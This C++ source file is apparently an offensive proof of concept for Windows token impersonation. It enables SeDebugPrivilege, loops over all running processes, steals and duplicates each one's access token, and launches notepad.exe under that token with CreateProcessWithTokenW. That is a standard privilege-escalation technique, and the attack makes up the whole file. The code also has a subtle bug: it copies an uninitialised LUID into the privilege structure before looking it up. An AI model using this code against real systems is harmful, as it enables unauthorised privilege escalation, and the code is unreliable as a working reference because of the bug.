#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <conio.h>
 
using namespace std;
 
// set privilege
BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL res = TRUE;
 
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
    if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
    printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
    return res;
}
 
HANDLE getToken(DWORD pid) {
    HANDLE cToken = NULL;
    HANDLE ph = NULL;
    if (!setPrivilege(SE_DEBUG_NAME)) {
        printf("[-] Failed to set SE_DEBUG_NAME privilege\n");
        return NULL;
    }
    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
    if (ph == NULL) {
        cToken = (HANDLE)NULL;
    } else {
        BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
        if (!res) {
            cToken = (HANDLE)NULL;
        } else {
            printf("[+] Successfully get access token :)\n");
        }
    }
    if (ph != NULL) {
        CloseHandle(ph);
    }
    return cToken;
}
 
BOOL createProcess(HANDLE token, LPCWSTR app) {
    // initialize variables
    HANDLE dToken = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL res = TRUE;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);
 
    res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
    printf(res ? "[+] successfully duplicate process token :)\n" : "[-] failed to duplicate process token :(\n");
    res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
    printf(res ? "[+] successfully create process :)\n" : "[-] failed to create process :(\n");
    return res;
}
 
int main(){
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;
                 
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;  
    pe32.dwSize = sizeof(PROCESSENTRY32); 
                 
    if(!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }
                 
    while (Process32Next(hProcSnap, &pe32)) {
        pid = pe32.th32ProcessID;
        if (!setPrivilege(SE_DEBUG_NAME)) return -1;
        bool success = false;
        cout << endl;
        HANDLE cToken = getToken(pid);
        printf("[!] Token: %d", cToken);
        cout << endl;
        success = createProcess(cToken, L"C:\\Windows\\System32\\notepad.exe");
        getch();
    }
    CloseHandle(hProcSnap);   
    return 0;    
}   